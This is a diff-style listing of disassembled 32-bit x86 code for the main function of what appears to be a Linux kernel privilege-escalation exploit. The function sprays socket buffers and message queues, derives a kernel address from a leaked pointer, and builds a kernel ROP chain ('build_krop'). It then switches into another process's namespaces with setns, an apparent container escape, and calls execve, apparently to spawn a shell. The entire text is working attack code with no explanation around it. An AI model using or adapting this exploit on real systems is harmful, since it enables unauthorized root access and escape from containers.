+        804b0f6:   mov     -0x5770(%ebp),%eax
+        804b0fc:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804b103:   push    $0x1337    
+        804b108:   push    $0x1fcc    
+        804b10d:   mov     $0x80eac80,%eax
+        804b113:   push    %eax       
+        804b114:   push    %edx       
+        804b115: → call    8049ef2 <read_msg>
+        804b11a:   add     $0x10,%esp 
+        804b11d:   test    %eax,%eax  
+        804b11f: ↓ js      804b7b5 <main+0x1155>
+        804b125:   sub     $0xc,%esp  
+        804b128:   lea     -0x31b8c(%ebx),%eax
+        804b12e:   push    %eax       
+        804b12f: → call    805a190 <_IO_puts>
+        804b134:   add     $0x10,%esp 
+        804b137:   movl    $0x0,-0x5750(%ebp)
+        804b141: ↓ jmp     804b1bf <main+0xb5f>
+        804b143:   lea     -0x56dc(%ebp),%edx
+        804b149:   mov     -0x5750(%ebp),%eax
+        804b14f:   shl     $0x3,%eax  
+        804b152:   add     %edx,%eax  
+        804b154:   sub     $0xc,%esp  
+        804b157:   push    %eax       
+        804b158: → call    8078560 <__pipe>
+        804b15d:   add     $0x10,%esp 
+        804b160:   test    %eax,%eax  
+        804b162: ↓ jns     804b17b <main+0xb1b>
+        804b164:   sub     $0xc,%esp  
+        804b167:   lea     -0x31b68(%ebx),%eax
+        804b16d:   push    %eax       
+        804b16e: → call    8052d10 <perror>
+        804b173:   add     $0x10,%esp 
+        804b176: ↓ jmp     804b7b9 <main+0x1159>
+        804b17b:   mov     -0x5750(%ebp),%eax
+        804b181:   mov     -0x56d8(%ebp,%eax,8),%edx
+        804b188:   sub     $0x4,%esp  
+        804b18b:   push    $0x3       
+        804b18d:   lea     -0x31b5f(%ebx),%eax
+        804b193:   push    %eax       
+        804b194:   push    %edx       
+        804b195: → call    8078140 <__libc_write>
+        804b19a:   add     $0x10,%esp 
+        804b19d:   test    %eax,%eax  
+        804b19f: ↓ jns     804b1b8 <main+0xb58>
+        804b1a1:   sub     $0xc,%esp  
+        804b1a4:   lea     -0x31fe2(%ebx),%eax
+        804b1aa:   push    %eax       
+        804b1ab: → call    8052d10 <perror>
+        804b1b0:   add     $0x10,%esp 
+        804b1b3: ↓ jmp     804b7b9 <main+0x1159>
+        804b1b8:   addl    $0x1,-0x5750(%ebp)
+        804b1bf:   cmpl    $0xff,-0x5750(%ebp)
+        804b1c9: ↑ jle     804b143 <main+0xae3>
+        804b1cf:   sub     $0xc,%esp  
+        804b1d2:   lea     -0x31b58(%ebx),%eax
+        804b1d8:   push    %eax       
+        804b1d9: → call    805a190 <_IO_puts>
+        804b1de:   add     $0x10,%esp 
+        804b1e1:   movl    $0x0,-0x574c(%ebp)
+        804b1eb: ↓ jmp     804b2af <main+0xc4f>
+        804b1f0:   movl    $0x0,-0x5748(%ebp)
+        804b1fa: ↓ jmp     804b29b <main+0xc3b>
+        804b1ff:   mov     -0x574c(%ebp),%eax
+        804b205:   mov     -0x56f8(%ebp,%eax,8),%edx
+        804b20c:   sub     $0x4,%esp  
+        804b20f:   push    $0x2c0     
+        804b214:   lea     -0xedc(%ebp),%eax
+        804b21a:   push    %eax       
+        804b21b:   push    %edx       
+        804b21c: → call    80780a0 <__libc_read>
+        804b221:   add     $0x10,%esp 
+        804b224:   test    %eax,%eax  
+        804b226: ↓ jns     804b23f <main+0xbdf>
+        804b228:   sub     $0xc,%esp  
+        804b22b:   lea     -0x31fd8(%ebx),%eax
+        804b231:   push    %eax       
+        804b232: → call    8052d10 <perror>
+        804b237:   add     $0x10,%esp 
+        804b23a: ↓ jmp     804b7b9 <main+0x1159>
+        804b23f:   lea     -0xedc(%ebp),%eax
+        804b245:   add     $0x10,%eax 
+        804b248:   mov     0x4(%eax),%edx
+        804b24b:   mov     (%eax),%eax
+        804b24d:   mov     %eax,%ecx  
+        804b24f:   xor     $0x1337,%ecx
+        804b255:   mov     %ecx,-0x57c8(%ebp)
+        804b25b:   mov     %edx,%eax  
+        804b25d:   xor     $0x0,%ah   
+        804b260:   mov     %eax,-0x57c4(%ebp)
+        804b266:   mov     -0x57c8(%ebp),%esi
+        804b26c:   mov     -0x57c4(%ebp),%edi
+        804b272:   mov     %edi,%eax  
+        804b274:   or      %esi,%eax  
+        804b276:   test    %eax,%eax  
+        804b278: ↓ je      804b294 <main+0xc34>
+        804b27a:   lea     -0xedc(%ebp),%eax
+        804b280:   add     $0x10,%eax 
+        804b283:   mov     0x4(%eax),%edx
+        804b286:   mov     (%eax),%eax
+        804b288:   mov     %eax,-0x5720(%ebp)
+        804b28e:   mov     %edx,-0x571c(%ebp)
+        804b294:   addl    $0x1,-0x5748(%ebp)
+        804b29b:   cmpl    $0x7f,-0x5748(%ebp)
+        804b2a2: ↑ jle     804b1ff <main+0xb9f>
+        804b2a8:   addl    $0x1,-0x574c(%ebp)
+        804b2af:   cmpl    $0x3,-0x574c(%ebp)
+        804b2b6: ↑ jle     804b1f0 <main+0xb90>
+        804b2bc:   mov     -0x5720(%ebp),%eax
+        804b2c2:   mov     -0x571c(%ebp),%edx
+        804b2c8:   add     $0xfef87c80,%eax
+        804b2cd:   adc     $0xffffffff,%edx
+        804b2d0:   mov     %eax,-0x5710(%ebp)
+        804b2d6:   mov     %edx,-0x570c(%ebp)
+        804b2dc:   sub     $0x4,%esp  
+        804b2df:   pushl   -0x571c(%ebp)
+        804b2e5:   pushl   -0x5720(%ebp)
+        804b2eb:   lea     -0x31b2a(%ebx),%eax
+        804b2f1:   push    %eax       
+        804b2f2: → call    8052c30 <_IO_printf>
+        804b2f7:   add     $0x10,%esp 
+        804b2fa:   sub     $0x4,%esp  
+        804b2fd:   pushl   -0x570c(%ebp)
+        804b303:   pushl   -0x5710(%ebp)
+        804b309:   lea     -0x31b0d(%ebx),%eax
+        804b30f:   push    %eax       
+        804b310: → call    8052c30 <_IO_printf>
+        804b315:   add     $0x10,%esp 
+        804b318:   mov     -0x5710(%ebp),%eax
+        804b31e:   and     $0xfffff,%eax
+        804b323:   mov     %eax,-0x57a0(%ebp)
+        804b329:   mov     -0x570c(%ebp),%eax
+        804b32f:   mov     $0x0,%ax   
+        804b333:   mov     %eax,-0x579c(%ebp)
+        804b339:   mov     -0x57a0(%ebp),%eax
+        804b33f:   mov     -0x579c(%ebp),%edx
+        804b345:   mov     %eax,%ecx  
+        804b347:   xor     $0x0,%ch   
+        804b34a:   mov     %ecx,-0x57d0(%ebp)
+        804b350:   mov     %edx,%eax  
+        804b352:   xor     $0xffff0000,%eax
+        804b357:   mov     %eax,-0x57cc(%ebp)
+        804b35d:   mov     -0x57d0(%ebp),%esi
+        804b363:   mov     -0x57cc(%ebp),%edi
+        804b369:   mov     %edi,%eax  
+        804b36b:   or      %esi,%eax  
+        804b36d:   test    %eax,%eax  
+        804b36f: ↓ je      804b388 <main+0xd28>
+        804b371:   sub     $0xc,%esp  
+        804b374:   lea     -0x31af4(%ebx),%eax
+        804b37a:   push    %eax       
+        804b37b: → call    805a190 <_IO_puts>
+        804b380:   add     $0x10,%esp 
+        804b383: ↓ jmp     804b7b9 <main+0x1159>
+        804b388:   sub     $0xc,%esp  
+        804b38b:   push    $0xa       
+        804b38d: → call    805a340 <putchar>
+        804b392:   add     $0x10,%esp 
+        804b395:   sub     $0xc,%esp  
+        804b398:   lea     -0x31ac8(%ebx),%eax
+        804b39e:   push    %eax       
+        804b39f: → call    805a190 <_IO_puts>
+        804b3a4:   add     $0x10,%esp 
+        804b3a7:   sub     $0xc,%esp  
+        804b3aa:   lea     -0x31aa4(%ebx),%eax
+        804b3b0:   push    %eax       
+        804b3b1: → call    805a190 <_IO_puts>
+        804b3b6:   add     $0x10,%esp 
+        804b3b9:   sub     $0x4,%esp  
+        804b3bc:   push    $0x2c0     
+        804b3c1:   push    $0x0       
+        804b3c3:   lea     -0xedc(%ebp),%eax
+        804b3c9:   push    %eax       
+        804b3ca: → call    80490c0 <.plt+0x90>
+        804b3cf:   add     $0x10,%esp 
+        804b3d2:   lea     -0xedc(%ebp),%eax
+        804b3d8:   mov     %eax,-0x572c(%ebp)
+        804b3de:   mov     -0x5718(%ebp),%eax
+        804b3e4:   mov     -0x5714(%ebp),%edx
+        804b3ea:   add     $0x290,%eax
+        804b3ef:   adc     $0x0,%edx  
+        804b3f2:   mov     -0x572c(%ebp),%ecx
+        804b3f8:   mov     %eax,0x10(%ecx)
+        804b3fb:   mov     %edx,0x14(%ecx)
+        804b3fe:   lea     -0xedc(%ebp),%eax
+        804b404:   add     $0x290,%eax
+        804b409:   mov     %eax,-0x5728(%ebp)
+        804b40f:   mov     -0x5710(%ebp),%eax
+        804b415:   mov     -0x570c(%ebp),%edx
+        804b41b:   add     $0x6e9783,%eax
+        804b420:   adc     $0x0,%edx  
+        804b423:   mov     -0x5728(%ebp),%ecx
+        804b429:   mov     %eax,0x8(%ecx)
+        804b42c:   mov     %edx,0xc(%ecx)
+        804b42f:   mov     -0x5718(%ebp),%eax
+        804b435:   mov     -0x5714(%ebp),%edx
+        804b43b:   add     $0x2b0,%eax
+        804b440:   adc     $0x0,%edx  
+        804b443:   sub     $0xc,%esp  
+        804b446:   push    %edx       
+        804b447:   push    %eax       
+        804b448:   pushl   -0x570c(%ebp)
+        804b44e:   pushl   -0x5710(%ebp)
+        804b454:   lea     -0xedc(%ebp),%eax
+        804b45a:   push    %eax       
+        804b45b: → call    804a18e <build_krop>
+        804b460:   add     $0x20,%esp 
+        804b463:   sub     $0x4,%esp  
+        804b466:   push    $0x2c0     
+        804b46b:   lea     -0xedc(%ebp),%eax
+        804b471:   push    %eax       
+        804b472:   lea     -0x56fc(%ebp),%eax
+        804b478:   push    %eax       
+        804b479: → call    8049f4c <spray_skbuff>
+        804b47e:   add     $0x10,%esp 
+        804b481:   test    %eax,%eax  
+        804b483: ↓ js      804b7b8 <main+0x1158>
+        804b489:   sub     $0xc,%esp  
+        804b48c:   lea     -0x31a78(%ebx),%eax
+        804b492:   push    %eax       
+        804b493: → call    805a190 <_IO_puts>
+        804b498:   add     $0x10,%esp 
+        804b49b:   movl    $0x0,-0x5744(%ebp)
+        804b4a5: ↓ jmp     804b516 <main+0xeb6>
+        804b4a7:   mov     -0x5744(%ebp),%eax
+        804b4ad:   mov     -0x56dc(%ebp,%eax,8),%eax
+        804b4b4:   sub     $0xc,%esp  
+        804b4b7:   push    %eax       
+        804b4b8: → call    80784a0 <__close>
+        804b4bd:   add     $0x10,%esp 
+        804b4c0:   test    %eax,%eax  
+        804b4c2: ↓ jns     804b4db <main+0xe7b>
+        804b4c4:   sub     $0xc,%esp  
+        804b4c7:   lea     -0x31a53(%ebx),%eax
+        804b4cd:   push    %eax       
+        804b4ce: → call    8052d10 <perror>
+        804b4d3:   add     $0x10,%esp 
+        804b4d6: ↓ jmp     804b7b9 <main+0x1159>
+        804b4db:   mov     -0x5744(%ebp),%eax
+        804b4e1:   mov     -0x56d8(%ebp,%eax,8),%eax
+        804b4e8:   sub     $0xc,%esp  
+        804b4eb:   push    %eax       
+        804b4ec: → call    80784a0 <__close>
+        804b4f1:   add     $0x10,%esp 
+        804b4f4:   test    %eax,%eax  
+        804b4f6: ↓ jns     804b50f <main+0xeaf>
+        804b4f8:   sub     $0xc,%esp  
+        804b4fb:   lea     -0x31a53(%ebx),%eax
+        804b501:   push    %eax       
+        804b502: → call    8052d10 <perror>
+        804b507:   add     $0x10,%esp 
+        804b50a: ↓ jmp     804b7b9 <main+0x1159>
+        804b50f:   addl    $0x1,-0x5744(%ebp)
+        804b516:   cmpl    $0xff,-0x5744(%ebp)
+        804b520: ↑ jle     804b4a7 <main+0xe47>
+        804b522:   sub     $0xc,%esp  
+        804b525:   lea     -0x31a49(%ebx),%eax
+        804b52b:   push    %eax       
+        804b52c: → call    805a190 <_IO_puts>
+        804b531:   add     $0x10,%esp 
+        804b534:   sub     $0x8,%esp  
+        804b537:   push    $0x0       
+        804b539:   lea     -0x31a30(%ebx),%eax
+        804b53f:   push    %eax       
+        804b540: → call    8077fe0 <__libc_open>
+        804b545:   add     $0x10,%esp 
+        804b548:   mov     %eax,-0x5724(%ebp)
+        804b54e:   cmpl    $0x0,-0x5724(%ebp)
+        804b555: ↓ jns     804b56e <main+0xf0e>
+        804b557:   sub     $0xc,%esp  
+        804b55a:   lea     -0x31a24(%ebx),%eax
+        804b560:   push    %eax       
+        804b561: → call    805a190 <_IO_puts>
+        804b566:   add     $0x10,%esp 
+        804b569: ↓ jmp     804b7b9 <main+0x1159>
+        804b56e:   sub     $0xc,%esp  
+        804b571:   pushl   -0x5724(%ebp)
+        804b577: → call    80784a0 <__close>
+        804b57c:   add     $0x10,%esp 
+        804b57f:   sub     $0xc,%esp  
+        804b582:   lea     -0x319fa(%ebx),%eax
+        804b588:   push    %eax       
+        804b589: → call    805a190 <_IO_puts>
+        804b58e:   add     $0x10,%esp 
+        804b591:   sub     $0xc,%esp  
+        804b594:   push    $0xa       
+        804b596: → call    805a340 <putchar>
+        804b59b:   add     $0x10,%esp 
+        804b59e:   sub     $0xc,%esp  
+        804b5a1:   lea     -0x319dc(%ebx),%eax
+        804b5a7:   push    %eax       
+        804b5a8: → call    805a190 <_IO_puts>
+        804b5ad:   add     $0x10,%esp 
+        804b5b0:   sub     $0xc,%esp  
+        804b5b3:   lea     -0x319bd(%ebx),%eax
+        804b5b9:   push    %eax       
+        804b5ba: → call    805a190 <_IO_puts>
+        804b5bf:   add     $0x10,%esp 
+        804b5c2:   sub     $0x8,%esp  
+        804b5c5:   push    $0x0       
+        804b5c7:   lea     -0x319a3(%ebx),%eax
+        804b5cd:   push    %eax       
+        804b5ce: → call    8077fe0 <__libc_open>
+        804b5d3:   add     $0x10,%esp 
+        804b5d6:   sub     $0x8,%esp  
+        804b5d9:   push    $0x0       
+        804b5db:   push    %eax       
+        804b5dc: → call    807a5c0 <setns>
+        804b5e1:   add     $0x10,%esp 
+        804b5e4:   sub     $0x8,%esp  
+        804b5e7:   push    $0x0       
+        804b5e9:   lea     -0x31994(%ebx),%eax
+        804b5ef:   push    %eax       
+        804b5f0: → call    8077fe0 <__libc_open>
+        804b5f5:   add     $0x10,%esp 
+        804b5f8:   sub     $0x8,%esp  
+        804b5fb:   push    $0x0       
+        804b5fd:   push    %eax       
+        804b5fe: → call    807a5c0 <setns>
+        804b603:   add     $0x10,%esp 
+        804b606:   sub     $0x8,%esp  
+        804b609:   push    $0x0       
+        804b60b:   lea     -0x31985(%ebx),%eax
+        804b611:   push    %eax       
+        804b612: → call    8077fe0 <__libc_open>
+        804b617:   add     $0x10,%esp 
+        804b61a:   sub     $0x8,%esp  
+        804b61d:   push    $0x0       
+        804b61f:   push    %eax       
+        804b620: → call    807a5c0 <setns>
+        804b625:   add     $0x10,%esp 
+        804b628:   sub     $0xc,%esp  
+        804b62b:   lea     -0x31976(%ebx),%eax
+        804b631:   push    %eax       
+        804b632: → call    805a190 <_IO_puts>
+        804b637:   add     $0x10,%esp 
+        804b63a:   movl    $0x0,-0x5740(%ebp)
+        804b644: ↓ jmp     804b691 <main+0x1031>
+        804b646:   mov     -0x5740(%ebp),%eax
+        804b64c:   cmp     -0x5770(%ebp),%eax
+        804b652: ↓ je      804b689 <main+0x1029>
+        804b654:   mov     -0x5740(%ebp),%eax
+        804b65a:   mov     -0x4edc(%ebp,%eax,4),%eax
+        804b661:   sub     $0x4,%esp  
+        804b664:   push    $0x0       
+        804b666:   push    $0x0       
+        804b668:   push    %eax       
+        804b669: → call    807a940 <__new_msgctl>
+        804b66e:   add     $0x10,%esp 
+        804b671:   test    %eax,%eax  
+        804b673: ↓ jns     804b68a <main+0x102a>
+        804b675:   sub     $0xc,%esp  
+        804b678:   lea     -0x31963(%ebx),%eax
+        804b67e:   push    %eax       
+        804b67f: → call    8052d10 <perror>
+        804b684:   add     $0x10,%esp 
+        804b687: ↓ jmp     804b68a <main+0x102a>
+        804b689:   nop                
+        804b68a:   addl    $0x1,-0x5740(%ebp)
+        804b691:   cmpl    $0xfff,-0x5740(%ebp)
+        804b69b: ↑ jle     804b646 <main+0xfe6>
+        804b69d:   movl    $0x0,-0x573c(%ebp)
+        804b6a7: ↓ jmp     804b70e <main+0x10ae>
+        804b6a9:   mov     -0x573c(%ebp),%eax
+        804b6af:   mov     -0x56fc(%ebp,%eax,8),%eax
+        804b6b6:   sub     $0xc,%esp  
+        804b6b9:   push    %eax       
+        804b6ba: → call    80784a0 <__close>
+        804b6bf:   add     $0x10,%esp 
+        804b6c2:   test    %eax,%eax  
+        804b6c4: ↓ jns     804b6d8 <main+0x1078>
+        804b6c6:   sub     $0xc,%esp  
+        804b6c9:   lea     -0x31a53(%ebx),%eax
+        804b6cf:   push    %eax       
+        804b6d0: → call    8052d10 <perror>
+        804b6d5:   add     $0x10,%esp 
+        804b6d8:   mov     -0x573c(%ebp),%eax
+        804b6de:   mov     -0x56f8(%ebp,%eax,8),%eax
+        804b6e5:   sub     $0xc,%esp  
+        804b6e8:   push    %eax       
+        804b6e9: → call    80784a0 <__close>
+        804b6ee:   add     $0x10,%esp 
+        804b6f1:   test    %eax,%eax  
+        804b6f3: ↓ jns     804b707 <main+0x10a7>
+        804b6f5:   sub     $0xc,%esp  
+        804b6f8:   lea     -0x31a53(%ebx),%eax
+        804b6fe:   push    %eax       
+        804b6ff: → call    8052d10 <perror>
+        804b704:   add     $0x10,%esp 
+        804b707:   addl    $0x1,-0x573c(%ebp)
+        804b70e:   cmpl    $0x3,-0x573c(%ebp)
+        804b715: ↑ jle     804b6a9 <main+0x1049>
+        804b717:   sub     $0xc,%esp  
+        804b71a:   pushl   -0x5734(%ebp)
+        804b720: → call    80784a0 <__close>
+        804b725:   add     $0x10,%esp 
+        804b728:   test    %eax,%eax  
+        804b72a: ↓ jns     804b73e <main+0x10de>
+        804b72c:   sub     $0xc,%esp  
+        804b72f:   lea     -0x31a53(%ebx),%eax
+        804b735:   push    %eax       
+        804b736: → call    8052d10 <perror>
+        804b73b:   add     $0x10,%esp 
+        804b73e:   sub     $0xc,%esp  
+        804b741:   lea     -0x31958(%ebx),%eax
+        804b747:   push    %eax       
+        804b748: → call    805a190 <_IO_puts>
+        804b74d:   add     $0x10,%esp 
+        804b750:   lea     -0x3193e(%ebx),%eax
+        804b756:   mov     %eax,-0x5708(%ebp)
+        804b75c:   lea     -0x31934(%ebx),%eax
+        804b762:   mov     %eax,-0x5704(%ebp)
+        804b768:   movl    $0x0,-0x5700(%ebp)
+        804b772:   mov     -0x5708(%ebp),%eax
+        804b778:   sub     $0x4,%esp  
+        804b77b:   push    $0x0       
+        804b77d:   lea     -0x5708(%ebp),%edx
+        804b783:   push    %edx       
+        804b784:   push    %eax       
+        804b785: → call    8077940 <__execve>
+        804b78a:   add     $0x10,%esp 
+        804b78d:   mov     $0x0,%eax  
+        804b792: ↓ jmp     804b827 <main+0x11c7>
+        804b797:   nop                
+        804b798: ↓ jmp     804b7b9 <main+0x1159>
+        804b79a:   nop                
+        804b79b: ↓ jmp     804b7b9 <main+0x1159>
+        804b79d:   nop                
+        804b79e: ↓ jmp     804b7b9 <main+0x1159>
+        804b7a0:   nop                
+        804b7a1: ↓ jmp     804b7b9 <main+0x1159>
+        804b7a3:   nop                
+        804b7a4: ↓ jmp     804b7b9 <main+0x1159>
+        804b7a6:   nop                
+        804b7a7: ↓ jmp     804b7b9 <main+0x1159>
+        804b7a9:   nop                
+        804b7aa: ↓ jmp     804b7b9 <main+0x1159>
+        804b7ac:   nop                
+        804b7ad: ↓ jmp     804b7b9 <main+0x1159>
+        804b7af:   nop                
+        804b7b0: ↓ jmp     804b7b9 <main+0x1159>
+        804b7b2:   nop                
+        804b7b3: ↓ jmp     804b7b9 <main+0x1159>
+        804b7b5:   nop                
+        804b7b6: ↓ jmp     804b7b9 <main+0x1159>
+        804b7b8:   nop                
+        804b7b9:   movl    $0x0,-0x5738(%ebp)
+        804b7c3: ↓ jmp     804b810 <main+0x11b0>
+        804b7c5:   mov     -0x5738(%ebp),%eax
+        804b7cb:   cmp     -0x5770(%ebp),%eax
+        804b7d1: ↓ je      804b808 <main+0x11a8>
+        804b7d3:   mov     -0x5738(%ebp),%eax
+        804b7d9:   mov     -0x4edc(%ebp,%eax,4),%eax
+        804b7e0:   sub     $0x4,%esp  
+        804b7e3:   push    $0x0       
+        804b7e5:   push    $0x0       
+        804b7e7:   push    %eax       
+        804b7e8: → call    807a940 <__new_msgctl>
+        804b7ed:   add     $0x10,%esp 
+        804b7f0:   test    %eax,%eax  
+        804b7f2: ↓ jns     804b809 <main+0x11a9>
+        804b7f4:   sub     $0xc,%esp  
+        804b7f7:   lea     -0x31963(%ebx),%eax
+        804b7fd:   push    %eax       
+        804b7fe: → call    8052d10 <perror>
+        804b803:   add     $0x10,%esp 
+        804b806: ↓ jmp     804b809 <main+0x11a9>
+        804b808:   nop                
+        804b809:   addl    $0x1,-0x5738(%ebp)
+        804b810:   cmpl    $0xfff,-0x5738(%ebp)
+        804b81a: ↑ jle     804b7c5 <main+0x1165>
+        804b81c: ↓ jmp     804b822 <main+0x11c2>
+        804b81e:   nop                
+        804b81f: ↓ jmp     804b822 <main+0x11c2>
+        804b821:   nop                
+        804b822:   mov     $0x1,%eax  
+        804b827:   mov     -0x1c(%ebp),%edi
+        804b82a:   xor     %gs:0x14,%edi
+        804b831: ↓ je      804b838 <main+0x11d8>
+        804b833: → call    807ace0 <__stack_chk_fail>
+        804b838:   lea     -0x10(%ebp),%esp
+        804b83b:   pop     %ecx       
+        804b83c:   pop     %ebx       
+        804b83d:   pop     %esi       
+        804b83e:   pop     %edi       
+        804b83f:   pop     %ebp       
+        804b840:   lea     -0x4(%ecx),%esp
+        804b843: ← ret                
